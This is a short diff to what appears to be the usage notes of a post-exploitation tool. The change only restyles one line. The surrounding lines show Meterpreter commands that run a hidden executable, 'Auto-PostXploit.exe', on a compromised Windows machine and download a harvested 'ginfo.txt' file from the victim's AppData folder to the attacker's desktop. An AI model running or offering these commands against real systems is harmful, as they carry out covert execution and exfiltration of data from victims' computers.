@@ -19,7 +19,7 @@
   
    - meterpreter > execute -H -f C:/Users/%USERNAME%/AppData/Auto-PostXploit.exe
   
-  <i style="color:red;">[If Auto-PostXploit.exe Not In Process]</i>
+    <i>If Auto-PostXploit.exe Not In Process</i>
   
    - meterpreter > download C:/Users/%USERNAME%/AppData/ginfo.txt /root/Desktop
   
